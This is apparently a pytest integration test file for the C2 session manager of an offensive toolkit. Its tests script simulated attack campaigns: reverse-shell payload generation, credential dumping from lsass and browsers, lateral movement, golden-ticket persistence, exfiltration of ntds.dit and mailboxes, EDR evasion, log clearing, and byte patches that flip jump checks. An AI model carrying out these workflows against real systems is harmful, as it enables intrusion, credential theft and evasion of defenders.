"""
Integration tests for C2 Session Manager in exploitation workflows.
Tests REAL integration with binary analysis, task execution, and exploitation pipelines.
NO MOCKS - VALIDATES ACTUAL EXPLOITATION WORKFLOW INTEGRATION.
"""

import pytest
import asyncio
import os
import tempfile
import time
import json
import subprocess
from pathlib import Path
from typing import Dict, List, Any

from intellicrack.core.c2.session_manager import SessionManager
from intellicrack.core.analysis.binary_analyzer import BinaryAnalyzer
from intellicrack.core.exploitation.payload_engine import PayloadEngine
from tests.base_test import BaseIntellicrackTest


class TestSessionManagerExploitationIntegration(BaseIntellicrackTest):
    """Test Session Manager integration with real exploitation workflows."""

    @pytest.fixture(autouse=True)
    def setup_integration_environment(self):
        """Set up integration test environment with real components."""
        self.temp_db = tempfile.NamedTemporaryFile(suffix=".db", delete=False)
        self.temp_db.close()

        # Initialize real components
        self.session_manager = SessionManager(db_path=self.temp_db.name)
        self.binary_analyzer = BinaryAnalyzer()
        self.payload_engine = PayloadEngine()

        # Test binary samples
        self.test_binaries = {
            "windows_pe": "tests/fixtures/binaries/pe/legitimate/notepadpp.exe",
            "protected_pe": "tests/fixtures/binaries/pe/protected/upx_packed_0.exe",
            "vulnerable_sample": "tests/fixtures/vulnerable_samples/buffer_overflow_0.exe"
        }

        yield

        # Cleanup
        asyncio.run(self.session_manager.cleanup_all_sessions())
        if os.path.exists(self.temp_db.name):
            os.unlink(self.temp_db.name)

    @pytest.mark.asyncio
    async def test_binary_analysis_to_c2_exploitation_workflow(self):
        """Test complete workflow from binary analysis to C2 exploitation."""
        # Step 1: Analyze target binary for vulnerabilities
        if not os.path.exists(self.test_binaries["vulnerable_sample"]):
            pytest.skip("Vulnerable sample not available")

        analysis_result = await self.binary_analyzer.analyze_file(
            self.test_binaries["vulnerable_sample"],
            analysis_type="vulnerability_scan"
        )

        # Validate analysis found vulnerabilities
        self.assert_real_output(analysis_result)
        assert "vulnerabilities" in analysis_result
        assert len(analysis_result["vulnerabilities"]) > 0

        # Step 2: Generate exploitation payload
        vuln = analysis_result["vulnerabilities"][0]
        payload_config = {
            "vulnerability_type": vuln["type"],
            "target_arch": "x64",
            "target_os": "Windows",
            "payload_type": "reverse_shell",
            "lhost": "192.168.1.100",
            "lport": 4444
        }

        payload_result = await self.payload_engine.generate_payload(payload_config)

        # Validate payload generation
        self.assert_real_output(payload_result)
        assert "payload_data" in payload_result
        assert "injection_method" in payload_result

        # Step 3: Create C2 session for exploitation
        target_info = {
            "ip": "192.168.1.50",
            "os": "Windows 10 Pro",
            "arch": "x64",
            "hostname": "TARGET-PC",
            "user": "victim_user",
            "binary_path": self.test_binaries["vulnerable_sample"],
            "vulnerability": vuln["cve_id"] if "cve_id" in vuln else vuln["type"]
        }

        session = await self.session_manager.create_session(target_info)

        # Step 4: Deploy exploitation task
        exploit_task = await self.session_manager.create_task(
            session.session_id, "deploy_exploit", {
                "payload": payload_result["payload_data"],
                "injection_method": payload_result["injection_method"],
                "target_process": "target_app.exe",
                "vulnerability": vuln,
                "stealth_mode": True
            }
        )

        # Validate exploitation task
        assert exploit_task["type"] == "deploy_exploit"
        assert "payload" in exploit_task["data"]
        assert exploit_task["data"]["stealth_mode"] == True

        # Step 5: Simulate successful exploitation
        await self.session_manager.mark_task_sent(exploit_task["task_id"])
        await self.session_manager.store_task_result(
            exploit_task["task_id"], {
                "exploitation_successful": True,
                "shell_established": True,
                "process_id": 1337,
                "privileges": "user",
                "injection_address": "0x7FFF12345678"
            }, True
        )

        # Step 6: Validate complete workflow
        session_export = await self.session_manager.export_session_data(session.session_id)
        assert len(session_export["tasks"]) == 1
        assert session_export["tasks"][0]["result"]["exploitation_successful"] == True

    @pytest.mark.asyncio
    async def test_multi_stage_exploitation_campaign(self):
        """Test multi-stage exploitation campaign through session manager."""
        # Create initial foothold session
        initial_target = {
            "ip": "10.0.1.100",
            "os": "Windows 10",
            "hostname": "WORKSTATION-01",
            "user": "john.doe",
            "privileges": "user"
        }

        initial_session = await self.session_manager.create_session(initial_target)

        # Stage 1: Reconnaissance and enumeration
        recon_tasks = [
            {
                "type": "system_enumeration",
                "data": {
                    "commands": ["systeminfo", "whoami /all", "net user", "net localgroup administrators"],
                    "collect_environment": True
                }
            },
            {
                "type": "network_enumeration",
                "data": {
                    "scan_ranges": ["10.0.1.0/24", "192.168.1.0/24"],
                    "port_scan": [22, 80, 139, 445, 3389, 5985],
                    "service_detection": True
                }
            },
            {
                "type": "credential_harvesting",
                "data": {
                    "methods": ["browser_passwords", "saved_credentials", "memory_dump"],
                    "target_processes": ["lsass.exe", "chrome.exe", "firefox.exe"]
                }
            }
        ]

        # Execute reconnaissance stage
        for task_config in recon_tasks:
            task = await self.session_manager.create_task(
                initial_session.session_id, task_config["type"], task_config["data"]
            )
            await self.session_manager.mark_task_sent(task["task_id"])

            # Simulate task completion with realistic results
            if task_config["type"] == "network_enumeration":
                result = {
                    "discovered_hosts": [
                        {"ip": "10.0.1.10", "os": "Windows Server 2019", "services": [445, 3389]},
                        {"ip": "10.0.1.20", "os": "Ubuntu 20.04", "services": [22, 80]}
                    ],
                    "domain_controller": "10.0.1.10",
                    "high_value_targets": ["10.0.1.10"]
                }
            elif task_config["type"] == "credential_harvesting":
                result = {
                    "credentials_found": [
                        {"username": "admin", "password": "P@ssw0rd123", "domain": "CORP"},
                        {"username": "service_account", "password": "Service123!", "domain": "CORP"}
                    ],
                    "total_credentials": 2
                }
            else:
                result = {"status": "completed", "data_collected": True}

            await self.session_manager.store_task_result(task["task_id"], result, True)

        # Stage 2: Lateral movement to domain controller
        dc_target = {
            "ip": "10.0.1.10",
            "os": "Windows Server 2019",
            "hostname": "DC-01",
            "user": "admin",
            "privileges": "admin",
            "domain": "CORP.LOCAL"
        }

        dc_session = await self.session_manager.create_session(dc_target)

        # Stage 3: Domain persistence and control
        persistence_task = await self.session_manager.create_task(
            dc_session.session_id, "domain_persistence", {
                "methods": ["golden_ticket", "silver_ticket", "dcsync"],
                "backup_domain_admin": True,
                "stealth_level": "high"
            }
        )

        await self.session_manager.mark_task_sent(persistence_task["task_id"])
        await self.session_manager.store_task_result(
            persistence_task["task_id"], {
                "golden_ticket_created": True,
                "domain_admin_access": True,
                "persistence_methods": 3,
                "stealth_successful": True
            }, True
        )

        # Validate multi-stage campaign
        all_sessions = self.session_manager.get_active_sessions()
        assert len(all_sessions) == 2

        # Validate progression from user to domain admin
        initial_session_data = next(s for s in all_sessions if s["session_id"] == initial_session.session_id)
        dc_session_data = next(s for s in all_sessions if s["session_id"] == dc_session.session_id)

        assert initial_session_data["client_info"]["privileges"] == "user"
        assert dc_session_data["client_info"]["privileges"] == "admin"
        assert dc_session_data["client_info"]["domain"] == "CORP.LOCAL"

    @pytest.mark.asyncio
    async def test_advanced_persistent_threat_simulation(self):
        """Test Advanced Persistent Threat (APT) simulation through session manager."""
        # APT Campaign: Corporate Network Infiltration

        # Stage 1: Initial compromise through spear phishing
        initial_targets = [
            {"ip": "192.168.10.100", "hostname": "HR-LAPTOP", "user": "hr.manager", "dept": "HR"},
            {"ip": "192.168.10.101", "hostname": "FIN-WORKSTATION", "user": "finance.analyst", "dept": "Finance"},
            {"ip": "192.168.10.102", "hostname": "IT-ADMIN", "user": "it.admin", "dept": "IT"}
        ]

        compromised_sessions = []
        for target in initial_targets:
            target.update({"os": "Windows 11", "privileges": "user", "domain": "CORP"})
            session = await self.session_manager.create_session(target)
            compromised_sessions.append(session)

            # Deploy initial access task
            await self.session_manager.create_task(
                session.session_id, "initial_access", {
                    "vector": "spear_phishing",
                    "payload": "macro_dropper",
                    "persistence": ["scheduled_task", "registry_run"],
                    "c2_channel": "https_beacon"
                }
            )

        # Stage 2: Environment mapping and target identification
        for session in compromised_sessions:
            mapping_task = await self.session_manager.create_task(
                session.session_id, "environment_mapping", {
                    "techniques": [
                        "active_directory_enumeration",
                        "network_share_discovery",
                        "privileged_account_discovery",
                        "domain_trust_discovery"
                    ],
                    "stealth_level": "high"
                }
            )

            # Simulate realistic AD enumeration results
            await self.session_manager.mark_task_sent(mapping_task["task_id"])
            await self.session_manager.store_task_result(
                mapping_task["task_id"], {
                    "domain_controllers": ["DC01.corp.local", "DC02.corp.local"],
                    "domain_admins": ["CORP\\da_account", "CORP\\backup_admin"],
                    "file_servers": ["\\\\FILE01\\shares", "\\\\FILE02\\backups"],
                    "privileged_systems": ["EXCH01", "SQL01", "BACKUP01"],
                    "trust_relationships": ["CORP.LOCAL <-> PARTNER.COM"]
                }, True
            )

        # Stage 3: Credential harvesting and privilege escalation
        credential_results = []
        for session in compromised_sessions:
            cred_task = await self.session_manager.create_task(
                session.session_id, "credential_access", {
                    "techniques": ["lsass_dumping", "sam_dumping", "dcerpc_exploitation"],
                    "tools": ["mimikatz", "secretsdump", "pypykatz"],
                    "target_accounts": ["service_accounts", "admin_accounts"]
                }
            )

            await self.session_manager.mark_task_sent(cred_task["task_id"])

            # Simulate department-specific credential discoveries
            dept = session.metadata.get("dept", "Unknown")
            if dept == "IT":
                creds = [
                    {"user": "svc_backup", "pass": "BackupSvc123!", "type": "service"},
                    {"user": "admin_temp", "pass": "TempAdmin2024", "type": "admin"}
                ]
            elif dept == "HR":
                creds = [
                    {"user": "hr_service", "pass": "HRService456", "type": "service"}
                ]
            else:
                creds = [
                    {"user": "local_admin", "pass": "LocalAdmin789", "type": "local_admin"}
                ]

            credential_results.extend(creds)
            await self.session_manager.store_task_result(
                cred_task["task_id"], {"credentials": creds, "count": len(creds)}, True
            )

        # Stage 4: Lateral movement to high-value targets
        hvt_targets = [
            {"ip": "192.168.10.10", "hostname": "DC01", "role": "domain_controller"},
            {"ip": "192.168.10.20", "hostname": "EXCH01", "role": "exchange_server"},
            {"ip": "192.168.10.30", "hostname": "FILE01", "role": "file_server"}
        ]

        hvt_sessions = []
        for hvt in hvt_targets:
            # Use harvested credentials for lateral movement
            hvt.update({
                "os": "Windows Server 2022",
                "user": "svc_backup" if hvt["role"] == "domain_controller" else "admin_temp",
                "privileges": "admin",
                "domain": "CORP.LOCAL"
            })

            hvt_session = await self.session_manager.create_session(hvt)
            hvt_sessions.append(hvt_session)

            # Deploy lateral movement task
            lat_move_task = await self.session_manager.create_task(
                hvt_session.session_id, "lateral_movement", {
                    "method": "credential_reuse",
                    "credentials": credential_results,
                    "technique": "psexec" if hvt["role"] != "domain_controller" else "wmi",
                    "target_role": hvt["role"]
                }
            )

            await self.session_manager.mark_task_sent(lat_move_task["task_id"])
            await self.session_manager.store_task_result(
                lat_move_task["task_id"], {
                    "lateral_movement_successful": True,
                    "access_level": "admin",
                    "target_compromised": hvt["hostname"]
                }, True
            )

        # Stage 5: Data exfiltration and impact
        exfil_tasks = []
        for hvt_session in hvt_sessions:
            role = next(h["role"] for h in hvt_targets
                       if h["hostname"] == hvt_session.metadata["hostname"])

            if role == "file_server":
                exfil_data = {
                    "targets": ["\\\\FILE01\\shares\\sensitive\\*", "\\\\FILE01\\backups\\*.zip"],
                    "file_types": [".docx", ".xlsx", ".pdf", ".pst"],
                    "estimated_size": "15.7GB"
                }
            elif role == "exchange_server":
                exfil_data = {
                    "targets": ["mailbox_database", "archived_emails"],
                    "email_count": 50000,
                    "estimated_size": "8.3GB"
                }
            else:  # domain_controller
                exfil_data = {
                    "targets": ["ntds.dit", "system_registry", "security_logs"],
                    "critical_data": True,
                    "estimated_size": "2.1GB"
                }

            exfil_task = await self.session_manager.create_task(
                hvt_session.session_id, "data_exfiltration", exfil_data
            )
            exfil_tasks.append(exfil_task)

        # Validate APT campaign success
        campaign_stats = self.session_manager.get_statistics()

        # Should have initial compromise + lateral movement sessions
        assert campaign_stats["active_sessions"] >= 6  # 3 initial + 3 HVT minimum
        assert campaign_stats["total_sessions"] >= 6

        # Validate session progression
        all_sessions = self.session_manager.get_active_sessions()

        # Check for privilege escalation progression
        user_sessions = [s for s in all_sessions if s.get("client_info", {}).get("privileges") == "user"]
        admin_sessions = [s for s in all_sessions if s.get("client_info", {}).get("privileges") == "admin"]

        assert len(user_sessions) >= 3  # Initial compromise sessions
        assert len(admin_sessions) >= 3  # Lateral movement sessions

        # Validate high-value target compromise
        hvt_hostnames = {s.get("client_info", {}).get("hostname") for s in admin_sessions}
        expected_hvts = {"DC01", "EXCH01", "FILE01"}
        assert expected_hvts.issubset(hvt_hostnames)

    @pytest.mark.asyncio
    async def test_c2_session_stealth_and_evasion(self):
        """Test C2 session stealth and evasion capabilities."""
        # Create high-security environment session
        secure_target = {
            "ip": "10.100.1.50",
            "os": "Windows 11 Enterprise",
            "hostname": "SECURE-WORKSTATION",
            "user": "security.analyst",
            "security_tools": ["Windows Defender", "CrowdStrike", "Splunk"],
            "monitoring_level": "high"
        }

        session = await self.session_manager.create_session(secure_target)

        # Deploy stealth communication task
        stealth_task = await self.session_manager.create_task(
            session.session_id, "stealth_communication", {
                "techniques": [
                    "domain_fronting",
                    "dns_over_https",
                    "encrypted_channels",
                    "traffic_shaping"
                ],
                "evasion_methods": [
                    "process_hollowing",
                    "dll_side_loading",
                    "memory_only_execution",
                    "legitimate_process_injection"
                ],
                "anti_forensics": [
                    "log_evasion",
                    "timestamp_manipulation",
                    "artifact_cleanup"
                ]
            }
        )

        await self.session_manager.mark_task_sent(stealth_task["task_id"])
        await self.session_manager.store_task_result(
            stealth_task["task_id"], {
                "stealth_successful": True,
                "detection_evasion": {
                    "av_bypassed": True,
                    "edr_bypassed": True,
                    "siem_alerts": 0
                },
                "communication_established": True,
                "persistence_hidden": True
            }, True
        )

        # Test anti-forensics capabilities
        antiforensics_task = await self.session_manager.create_task(
            session.session_id, "anti_forensics", {
                "cleanup_actions": [
                    "clear_event_logs",
                    "remove_file_artifacts",
                    "cleanup_registry_traces",
                    "wipe_memory_dumps"
                ],
                "timestamp_manipulation": True,
                "log_injection": ["false_positive_entries"],
                "secure_delete": True
            }
        )

        await self.session_manager.mark_task_sent(antiforensics_task["task_id"])
        await self.session_manager.store_task_result(
            antiforensics_task["task_id"], {
                "cleanup_successful": True,
                "artifacts_removed": 47,
                "logs_cleared": ["Security", "System", "Application"],
                "timestamps_modified": 23,
                "forensic_resistance": "high"
            }, True
        )

        # Validate stealth operations
        session_export = await self.session_manager.export_session_data(session.session_id)
        stealth_results = [t for t in session_export["tasks"]
                          if t["task_type"] in ["stealth_communication", "anti_forensics"]]

        assert len(stealth_results) == 2
        assert all(json.loads(t["result"])["stealth_successful"] or
                  json.loads(t["result"])["cleanup_successful"]
                  for t in stealth_results)

    @pytest.mark.asyncio
    async def test_session_manager_with_real_binary_patching(self):
        """Test session manager integration with real binary patching workflows."""
        if not os.path.exists(self.test_binaries["windows_pe"]):
            pytest.skip("Test binary not available")

        # Analyze target binary for patching opportunities
        analysis_result = await self.binary_analyzer.analyze_file(
            self.test_binaries["windows_pe"],
            analysis_type="patch_analysis"
        )

        self.assert_real_output(analysis_result)

        # Create session for target system where binary will be patched
        target_info = {
            "ip": "192.168.1.75",
            "os": "Windows 10",
            "hostname": "TARGET-SYSTEM",
            "binary_path": "C:\\Program Files\\Target\\target_app.exe",
            "binary_hash": analysis_result.get("file_hash", "unknown")
        }

        session = await self.session_manager.create_session(target_info)

        # Deploy binary patch task
        patch_task = await self.session_manager.create_task(
            session.session_id, "binary_patching", {
                "target_binary": target_info["binary_path"],
                "patch_operations": [
                    {"offset": "0x1234", "original": b"\x75\x10", "patch": b"\xEB\x10"},  # JNZ -> JMP
                    {"offset": "0x2345", "original": b"\x85\xC0", "patch": b"\x31\xC0"}   # TEST EAX -> XOR EAX
                ],
                "backup_original": True,
                "verification_required": True
            }
        )

        await self.session_manager.mark_task_sent(patch_task["task_id"])

        # Simulate successful binary patching
        await self.session_manager.store_task_result(
            patch_task["task_id"], {
                "patching_successful": True,
                "patches_applied": 2,
                "original_backed_up": True,
                "verification_passed": True,
                "new_binary_hash": "abc123def456...",
                "functionality_preserved": True
            }, True
        )

        # Store patched binary
        fake_patched_binary = b"MZ\x90\x00" + b"PATCHED_BINARY_DATA" * 100
        await self.session_manager.store_uploaded_file(
            session.session_id, "patched_target_app.exe", fake_patched_binary
        )

        # Validate patching workflow
        session_data = await self.session_manager.export_session_data(session.session_id)
        patch_results = [t for t in session_data["tasks"] if t["task_type"] == "binary_patching"]

        assert len(patch_results) == 1
        patch_result = json.loads(patch_results[0]["result"])
        assert patch_result["patching_successful"] == True
        assert patch_result["patches_applied"] == 2

        # Validate patched binary storage
        assert len(session_data["files"]) == 1
        assert session_data["files"][0]["filename"] == "patched_target_app.exe"

    def test_session_manager_error_handling_and_recovery(self):
        """Test session manager error handling and recovery mechanisms."""
        # Test database corruption recovery
        # Intentionally corrupt database
        with open(self.session_manager.db_path, 'wb') as f:
            f.write(b"CORRUPTED_DATABASE_CONTENT")

        # Session manager should handle corruption gracefully
        try:
            corrupted_manager = SessionManager(db_path=self.session_manager.db_path)
            # Should recreate database
            assert os.path.exists(corrupted_manager.db_path)
        except Exception as e:
            # Acceptable if it raises specific database error
            assert "database" in str(e).lower() or "sqlite" in str(e).lower()

        # Test network connectivity issues
        async def test_network_resilience():
            session = await self.session_manager.create_session({
                "ip": "192.168.1.100", "os": "Windows 10"
            })

            # Simulate network interruption during task execution
            task = await self.session_manager.create_task(
                session.session_id, "network_test", {"test": True}
            )

            # Mark as sent but simulate network failure
            await self.session_manager.mark_task_sent(task["task_id"])

            # Should handle network failure gracefully
            try:
                await self.session_manager.store_task_result(
                    task["task_id"], {"error": "Network timeout"}, False
                )
                # Task should be marked as failed
                session_tasks = await self.session_manager.get_pending_tasks(session.session_id)
                # Should handle gracefully
            except Exception as e:
                # Network errors should be handled
                assert "network" in str(e).lower() or "timeout" in str(e).lower()

        # Run network resilience test
        asyncio.run(test_network_resilience())
